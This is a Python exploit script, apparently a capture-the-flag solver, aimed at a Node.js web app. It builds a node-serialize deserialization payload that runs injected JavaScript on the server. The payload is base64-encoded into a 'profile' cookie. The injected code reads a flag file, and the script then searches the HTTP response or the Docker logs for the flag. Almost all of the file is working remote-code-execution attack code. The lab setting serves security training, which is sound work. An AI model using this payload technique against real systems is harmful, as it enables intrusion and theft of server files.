import json
import os
import sys
import base64
import subprocess
import time
from typing import Tuple

try:
    import requests
except ImportError:
    import urllib.request
    import urllib.parse
    requests = None


def build_target() -> Tuple[str, int]:
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = os.environ.get("TARGET_HOST", "127.0.0.1")
        port = int(os.environ.get("TARGET_PORT", "5000"))
    return host, port


def generate_payload() -> str:
    malicious_code = """function(){
        var fs = require('fs');
        try {
            var flag = fs.readFileSync('/var/ctf/flag', 'utf8').trim();
            console.log('[EXPLOIT] Flag: ' + flag);
        } catch(e) {
            console.error('[EXPLOIT] Error: ' + e.message);
        }
    }()"""
    
    payload_obj = {
        "username": "hacker",
        "rce": f"_$$ND_FUNC$$_{malicious_code}"
    }
    
    payload_str = json.dumps(payload_obj)
    payload_b64 = base64.b64encode(payload_str.encode('utf-8')).decode('utf-8')
    
    return payload_b64




def run_exploit() -> None:
    host, port = build_target()
    url = f"http://{host}:{port}/"
    
    payload = generate_payload()
    
    print(f"[*] Target: {url}")
    print(f"[*] Payload (base64): {payload[:50]}...")
    
    decoded = base64.b64decode(payload).decode('utf-8')
    print(f"[*] Payload (decoded): {decoded[:100]}...")
    
    print(f"[*] Sending malicious cookie...")
    
    cookies = {
        'profile': payload
    }
    
    try:
        if requests:
            response = requests.get(url, cookies=cookies, timeout=5)
            response.raise_for_status()
            response_text = response.text
            status_code = response.status_code
        else:
            req = urllib.request.Request(url)
            cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            req.add_header('Cookie', cookie_str)
            response = urllib.request.urlopen(req, timeout=5)
            response_text = response.read().decode('utf-8')
            status_code = response.getcode()
        
        print("[+] Exploit sent successfully!")
        print(f"[*] Response status: {status_code}")
        
        if response_text:
            import re
            flag_pattern = r'FLAG\{[^}]+\}|[A-Za-z0-9_\-]{20,}'
            flags = re.findall(flag_pattern, response_text)
            if flags:
                print(f"[+] Flag found in response: {flags[0]}")
                return
        
        print("[*] Flag not found in HTTP response")
        print("[*] Exploit executed successfully - checking server logs...")
        
        time.sleep(0.5)
        
        container_name = os.environ.get("SERVICE_NAME", "testest")
        try:
            result = subprocess.run(
                ['docker', 'logs', '--tail', '50', container_name],
                capture_output=True,
                text=True,
                timeout=3
            )
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in reversed(lines):
                    if '[EXPLOIT] Flag:' in line:
                        flag = line.split('[EXPLOIT] Flag:')[1].strip()
                        print(f"[+] Flag found in server logs: {flag}")
                        return
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
            print(f"[*] Could not check Docker logs: {e}")
        
        print("[*] Look for '[EXPLOIT] Flag: ...' message in server logs")
        print(f"[*] Try: docker logs {container_name} | grep 'EXPLOIT'")
            
    except Exception as e:
        print(f"[!] Request failed: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    try:
        run_exploit()
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)

